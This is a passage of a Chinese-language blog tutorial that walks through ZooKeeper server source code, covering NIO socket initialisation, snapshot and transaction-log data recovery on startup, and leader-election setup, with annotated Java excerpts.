quorumPeer.setQuorumCnxnThreadsSize(config.quorumCnxnThreadsSize);</span><br><span class="line">    quorumPeer.initialize();</span><br><span class="line">    <span class="comment">// 启动 zk</span></span><br><span class="line">    quorumPeer.start();</span><br><span class="line">    quorumPeer.join();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">        <span class="comment">// warn, but generally this is ok</span></span><br><span class="line">        LOG.warn(<span class="string">"Quorum Peer interrupted"</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>初始化 NIO 服务端 Socket（并未启动）,ctrl + alt +B 查找 configure 实现类，NIOServerCnxnFactory.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">configure</span><span class="params">(InetSocketAddress addr, <span class="keyword">int</span> maxcc, <span class="keyword">boolean</span> secure)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="comment">// 初始化 NIO 服务端 socket，绑定 2181 端口，可以接收客户端请求</span></span><br><span class="line">    <span class="keyword">this</span>.ss = ServerSocketChannel.open();</span><br><span class="line">    ss.socket().setReuseAddress(<span class="keyword">true</span>);</span><br><span class="line">    LOG.info(<span class="string">"binding to port "</span> + addr);</span><br><span class="line">    <span class="comment">// 绑定 2181 端口</span></span><br><span class="line">    ss.socket().bind(addr);</span><br><span class="line">    ss.configureBlocking(<span class="keyword">false</span>);</span><br><span class="line">    acceptThread = <span class="keyword">new</span> AcceptThread(ss, addr, selectorThreads);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3、ZK-服务端加载数据源码解析">3、ZK 服务端加载数据源码解析</h2><p><img src="http://qnypic.shawncoding.top/blog/202402291817154.png" alt></p><p><img src="http://qnypic.shawncoding.top/blog/202402291817155.png" alt></p><h3 id="3-1-冷启动数据恢复快照数据">3.1 冷启动数据恢复快照数据</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!getView().containsKey(myid)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">"My id "</span> + myid + <span class="string">" not in the peer list"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 冷启动数据恢复</span></span><br><span class="line">    loadDataBase();</span><br><span class="line">    startServerCnxnFactory(); </span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="comment">// 启动通信工厂实例对象</span></span><br><span class="line">      adminServer.start();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (AdminServerException e) &#123; </span><br><span class="line">       LOG.warn(<span class="string">"Problem starting AdminServer"</span>, e); System.out.println(e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 准备选举环境</span></span><br><span class="line">    startLeaderElection();</span><br><span class="line">    <span class="comment">//  执行选举</span></span><br><span class="line">    <span class="keyword">super</span>.start();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">loadDataBase</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 加载磁盘数据到内存，恢复 DataTree</span></span><br><span class="line">        <span class="comment">// zk 的操作分两种：事务操作和非事务操作</span></span><br><span class="line">        <span class="comment">// 事务操作：zk.cteate()；都会被分配一个全局唯一的 zxid，zxid 组成：64 位：（前 32 位：epoch 每个 leader 任期的代号；后 32 位：txid 为事务 id）</span></span><br><span class="line">        <span class="comment">// 非事务操作：zk.getData()</span></span><br><span class="line">        zkDb.loadDataBase();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// load the epochs</span></span><br><span class="line">        <span class="keyword">long</span> lastProcessedZxid = zkDb.getDataTree().lastProcessedZxid;</span><br><span class="line">        <span class="keyword">long</span> epochOfZxid = ZxidUtils.getEpochFromZxid(lastProcessedZxid);</span><br><span class="line">        ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">restore</span><span class="params">(DataTree dt, Map&lt;Long, Integer&gt; sessions,PlayBackListener listener)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="comment">// 恢复快照文件数据到 DataTree</span></span><br><span class="line">    <span class="keyword">long</span> deserializeResult = snapLog.deserialize(dt, sessions);</span><br><span class="line">    FileTxnLog txnLog = <span class="keyword">new</span> FileTxnLog(dataDir);</span><br><span class="line">    RestoreFinalizer finalizer = () -&gt; &#123;</span><br><span class="line">    <span class="comment">// 恢复编辑日志数据到 DataTree</span></span><br><span class="line">    <span class="keyword">long</span> highestZxid = fastForwardFromEdits(dt, sessions, listener);</span><br><span class="line">    <span class="keyword">return</span> highestZxid;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ctrl + alt +B 查找 deserialize 实现类 FileSnap.java</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">deserialize</span><span class="params">(DataTree dt, Map&lt;Long, Integer&gt; sessions)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="comment">// 依次遍历每一个快照的数据</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>, snapListSize = snapList.size(); i &lt; snapListSize; i++) &#123;</span><br><span class="line">        snap = snapList.get(i);</span><br><span class="line">        LOG.info(<span class="string">"Reading snapshot "</span> + snap);</span><br><span class="line">        <span class="comment">// 反序列化环境准备</span></span><br><span class="line">        <span class="keyword">try</span> (InputStream snapIS = <span class="keyword">new</span> BufferedInputStream(<span class="keyword">new</span> FileInputStream(snap));</span><br><span class="line">             CheckedInputStream crcIn = <span class="keyword">new</span> CheckedInputStream(snapIS, <span class="keyword">new</span> Adler32())) &#123;</span><br><span class="line">            InputArchive ia = BinaryInputArchive.getArchive(crcIn);</span><br><span class="line">            <span class="comment">// 反序列化，恢复数据到 DataTree</span></span><br><span class="line">            deserialize(dt, sessions, ia);</span><br><span class="line">     ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">deserialize</span><span class="params">(DataTree dt, Map&lt;Long, Integer&gt; sessions,</span></span></span><br><span class="line"><span class="function"><span class="params">        InputArchive ia)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    FileHeader header = <span class="keyword">new</span> FileHeader();</span><br><span class="line">    header.deserialize(ia, <span class="string">"fileheader"</span>);</span><br><span class="line">    <span class="keyword">if</span> (header.getMagic() != SNAP_MAGIC) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">"mismatching magic headers "</span></span><br><span class="line">                + header.getMagic() +</span><br><span class="line">                <span class="string">" !=  "</span> + FileSnap.SNAP_MAGIC);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 恢复快照数据到 DataTree</span></span><br><span class="line">    SerializeUtils.deserializeSnapshot(dt,ia,sessions);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">deserializeSnapshot</span><span class="params">(DataTree dt,InputArchive ia,</span></span></span><br><span class="line"><span class="function"><span class="params">        Map&lt;Long, Integer&gt; sessions)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> count = ia.readInt(<span class="string">"count"</span>);</span><br><span class="line">    <span class="keyword">while</span> (count &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">long</span> id = ia.readLong(<span class="string">"id"</span>);</span><br><span class="line">        <span class="keyword">int</span> to = ia.readInt(<span class="string">"timeout"</span>);</span><br><span class="line">        sessions.put(id, to);</span><br><span class="line">        <span class="keyword">if</span> (LOG.isTraceEnabled()) &#123;</span><br><span class="line">            ZooTrace.logTraceMessage(LOG, ZooTrace.SESSION_TRACE_MASK,</span><br><span class="line">                    <span class="string">"loadData --- session in archive: "</span> + id</span><br><span class="line">                    + <span class="string">" with timeout: "</span> + to);</span><br><span class="line">        &#125;</span><br><span class="line">        count--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 恢复快照数据到 DataTree</span></span><br><span class="line">    dt.deserialize(ia, <span class="string">"tree"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">deserialize</span><span class="params">(InputArchive ia, String tag)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    aclCache.deserialize(ia);</span><br><span class="line">    nodes.clear();</span><br><span class="line">    pTrie.clear();</span><br><span class="line">    String path = ia.readString(<span class="string">"path"</span>);</span><br><span class="line">    <span class="comment">// 从快照中恢复每一个 datanode 节点数据到 DataTree</span></span><br><span class="line">    <span class="keyword">while</span> (!<span class="string">"/"</span>.equals(path)) &#123;</span><br><span class="line">        <span class="comment">// 每次循环创建一个节点对象  </span></span><br><span class="line">        DataNode node = <span class="keyword">new</span> DataNode();</span><br><span class="line">        ia.readRecord(node, <span class="string">"node"</span>);</span><br><span class="line">        <span class="comment">// 将 DataNode 恢复到 DataTree</span></span><br><span class="line">        nodes.put(path, node);</span><br><span class="line">        <span class="keyword">synchronized</span> (node) &#123;</span><br><span class="line">            aclCache.addUsage(node.acl);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> lastSlash = path.lastIndexOf(<span class="string">'/'</span>);</span><br><span class="line">        <span class="keyword">if</span> (lastSlash == -<span class="number">1</span>) &#123;</span><br><span class="line">            root = node;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 处理父节点</span></span><br><span class="line">            String parentPath = path.substring(<span class="number">0</span>, lastSlash);</span><br><span class="line">            DataNode parent = nodes.get(parentPath);</span><br><span class="line">            <span class="keyword">if</span> (parent == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">"Invalid Datatree, unable to find "</span> +</span><br><span class="line">                        <span class="string">"parent "</span> + parentPath + <span class="string">" of path "</span> + path);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 处理子节点</span></span><br><span class="line">            parent.addChild(path.substring(lastSlash + <span class="number">1</span>));</span><br><span class="line">            <span class="comment">// 处理临时节点和永久节点</span></span><br><span class="line">            <span class="keyword">long</span> eowner = node.stat.getEphemeralOwner();</span><br><span class="line">            EphemeralType ephemeralType = EphemeralType.get(eowner);</span><br><span class="line">            <span class="keyword">if</span> (ephemeralType == EphemeralType.CONTAINER) &#123;</span><br><span class="line">                containers.add(path);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ephemeralType == EphemeralType.TTL) &#123;</span><br><span class="line">                ttls.add(path);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (eowner != <span class="number">0</span>) &#123;</span><br><span class="line">                HashSet&lt;String&gt; list = ephemerals.get(eowner);</span><br><span class="line">                <span class="keyword">if</span> (list == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    list = <span class="keyword">new</span> HashSet&lt;String&gt;();</span><br><span class="line">                    ephemerals.put(eowner, list);</span><br><span class="line">                &#125;</span><br><span class="line">                list.add(path);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        path = ia.readString(<span class="string">"path"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    nodes.put(<span class="string">"/"</span>, root);</span><br><span class="line">    <span class="comment">// we are done with deserializing the</span></span><br><span class="line">    <span class="comment">// the datatree</span></span><br><span class="line">    <span class="comment">// update the quotas - create path trie</span></span><br><span class="line">    <span class="comment">// and also update the stat nodes</span></span><br><span class="line">    setupQuota();</span><br><span class="line"></span><br><span class="line">    aclCache.purgeUnused();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-2-冷启动数据恢复编辑日志">3.2 冷启动数据恢复编辑日志</h3><p>回到 FileTxnSnapLog.java 类中的 restore 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">restore</span><span class="params">(DataTree dt, Map&lt;Long, Integer&gt; sessions,PlayBackListener listener)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="comment">// 恢复快照文件数据到 DataTree</span></span><br><span class="line">    <span class="keyword">long</span> deserializeResult = snapLog.deserialize(dt, sessions);</span><br><span class="line">    FileTxnLog txnLog = <span class="keyword">new</span> FileTxnLog(dataDir);</span><br><span class="line"></span><br><span class="line">    RestoreFinalizer finalizer = () -&gt; &#123;</span><br><span class="line">        <span class="comment">// 恢复编辑日志数据到 DataTree</span></span><br><span class="line">        <span class="keyword">long</span> highestZxid = fastForwardFromEdits(dt, sessions, listener);</span><br><span class="line">        <span class="keyword">return</span> highestZxid;</span><br><span class="line">    &#125;;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">fastForwardFromEdits</span><span class="params">(DataTree dt, Map&lt;Long, Integer&gt; sessions,</span></span></span><br><span class="line"><span class="function"><span class="params">                                 PlayBackListener listener)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="comment">// 在此之前，已经从快照文件中恢复了大部分数据，接下来只需从快照的 zxid + 1位置开始恢复</span></span><br><span class="line">    TxnIterator itr = txnLog.read(dt.lastProcessedZxid+<span class="number">1</span>);</span><br><span class="line">    <span class="comment">// 快照中最大的 zxid，在执行编辑日志时，这个值会不断更新，直到所有操作执行完</span></span><br><span class="line">    <span class="keyword">long</span> highestZxid = dt.lastProcessedZxid;</span><br><span class="line">    TxnHeader hdr;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 从 lastProcessedZxid 事务编号器开始，不断的从编辑日志中恢复剩下的还没有恢复的数据</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            <span class="comment">// 获取事务头信息（有 zxid）</span></span><br><span class="line">            hdr = itr.getHeader();</span><br><span class="line">            <span class="keyword">if</span> (hdr == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">//empty logs</span></span><br><span class="line">                <span class="keyword">return</span> dt.lastProcessedZxid;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (hdr.getZxid() &lt; highestZxid &amp;&amp; highestZxid != <span class="number">0</span>) &#123;</span><br><span class="line">                LOG.error(<span class="string">"&#123;&#125;(highestZxid) &gt; &#123;&#125;(next log) for type &#123;&#125;"</span>,</span><br><span class="line">                        highestZxid, hdr.getZxid(), hdr.getType());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                highestZxid = hdr.getZxid();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 根据编辑日志恢复数据到 DataTree，每执行一次，对应的事务 id，highestZxid + 1</span></span><br><span class="line">                processTransaction(hdr,dt,sessions, itr.getTxn());</span><br><span class="line">            &#125; <span class="keyword">catch</span>(KeeperException.NoNodeException e) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">"Failed to process transaction type: "</span> +</span><br><span class="line">                     hdr.getType() + <span class="string">" error: "</span> + e.getMessage(), e);</span><br><span class="line">            &#125;</span><br><span class="line">            listener.onTxnLoaded(hdr, itr.getTxn());</span><br><span class="line">            <span class="keyword">if</span> (!itr.next())</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (itr != <span class="keyword">null</span>) &#123;</span><br><span class="line">            itr.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> highestZxid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4、ZK-选举源码解析">4、ZK 选举源码解析</h2><blockquote><p>选举流程可以参考之前的zookeeper基础学习</p></blockquote><p><img src="http://qnypic.shawncoding.top/blog/202402291817156.png" alt></p><h3 id="4-1-选举准备">4.1 选举准备</h3><p><img src="http://qnypic.shawncoding.top/blog/202402291817157.png" alt></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!getView().containsKey(myid)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">"My id "</span> + myid + <span class="string">" not in the peer list"</span>);</span><br><span class="line">     &#125;</span><br><span class="line">    loadDataBase();</span><br><span class="line">    startServerCnxnFactory();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        adminServer.start();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (AdminServerException e) &#123;</span><br><span class="line">        LOG.warn(<span class="string">"Problem starting AdminServer"</span>, e);</span><br><span class="line">        System.out.println(e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 选举准备</span></span><br><span class="line">    startLeaderElection();</span><br><span class="line">    <span class="keyword">super</span>.start();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">synchronized</span> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startLeaderElection</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">       <span class="keyword">if</span> (getPeerState() == ServerState.LOOKING) &#123;</span><br><span class="line">           <span class="comment">// 创建选票</span></span><br><span class="line">           <span class="comment">// （1）选票组件：epoch（leader 的任期代号）、zxid（某个 leader 当选期间执行的事务编号）、myid（serverid）</span></span><br><span class="line">           <span class="comment">// （2）开始选票时，都是先投自己</span></span><br><span class="line">           currentVote = <span class="keyword">new</span> Vote(myid, getLastLoggedZxid(), getCurrentEpoch());</span><br><span class="line">       &#125;</span><br><span class="line">    ......</span><br><span class="line">    <span class="comment">// 创建选举算法实例</span></span><br><span class="line">    <span class="keyword">this</span>.electionAlg = createElectionAlgorithm(electionType);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> Election <span class="title">createElectionAlgorithm</span><span class="params">(<span class="keyword">int</span> electionAlgorithm)</span></span>&#123;</span><br><span class="line">    Election le=<span class="keyword">null</span>;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="comment">// 1 创建 QuorumCnxnManager，负责选举过程中的所有网络通信</span></span><br><span class="line">        QuorumCnxManager qcm = createCnxnManager();</span><br><span class="line">        QuorumCnxManager oldQcm = qcmRef.getAndSet(qcm);</span><br><span class="line">        <span class="keyword">if</span> (oldQcm != <span class="keyword">null</span>) &#123;</span><br><span class="line">            LOG.warn(<span class="string">"Clobbering already-set QuorumCnxManager (restarting leader election?)"</span>);</span><br><span class="line">            oldQcm.halt();</span><br><span class="line">        &#125;</span><br><span class="line">        QuorumCnxManager.Listener listener = qcm.listener;</span><br><span class="line">        <span class="keyword">if</span>(listener != <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="comment">// 2 启动监听线程</span></span><br><span class="line">            listener.start();</span><br><span class="line">            <span class="comment">// 3 准备开始选举</span></span><br><span class="line">            FastLeaderElection fle = <span class="keyword">new</span> FastLeaderElection(<span class="keyword">this</span>, qcm);</span><br><span class="line">            fle.start();</span><br><span class="line">            le = fle;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            LOG.error(<span class="string">"Null listener when initializing cnx manager"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 网络通信组件初始化</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> QuorumCnxManager <span class="title">createCnxnManager</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> QuorumCnxManager(<span class="keyword">this</span>,</span><br><span class="line">            <span class="keyword">this</span>.getId(),</span><br><span class="line">            <span class="keyword">this</span>.getView(),</span><br><span class="line">            <span class="keyword">this</span>.authServer,</span><br><span class="line">            <span class="keyword">this</span>.authLearner,</span><br><span class="line">            <span class="keyword">this</span>.tickTime * <span class="keyword">this</span>.syncLimit,</span><br><span class="line">            <span class="keyword">this</span>.getQuorumListenOnAllIPs(),</span><br><span class="line">            <span class="keyword">this</span>.quorumCnxnThreadsSize,</span><br><span class="line">            <span class="keyword">this</span>.isQuorumSaslAuthEnabled());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">QuorumCnxManager</span><span class="params">(QuorumPeer self,</span></span></span><br><span class="line"><span class="function"><span class="params">                        <span class="keyword">final</span> <span class="keyword">long</span> mySid,</span></span></span><br><span class="line"><span class="function"><span class="params">                        Map&lt;Long,QuorumPeer.QuorumServer&gt; view,</span></span></span><br><span class="line"><span class="function"><span class="params">                        QuorumAuthServer authServer,</span></span></span><br><span class="line"><span class="function"><span class="params">                        QuorumAuthLearner authLearner,</span></span></span><br><span class="line"><span class="function"><span class="params">                        <span class="keyword">int</span> socketTimeout,</span></span></span><br><span class="line"><span class="function"><span class="params">                        <span class="keyword">boolean</span> listenOnAllIPs,</span></span></span><br><span class="line"><span class="function"><span class="params">                        <span class="keyword">int</span> quorumCnxnThreadsSize,</span></span></span><br><span class="line"><span class="function"><span class="params">                        <span class="keyword">boolean</span> quorumSaslAuthEnabled)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 创建各种队列</span></span><br><span 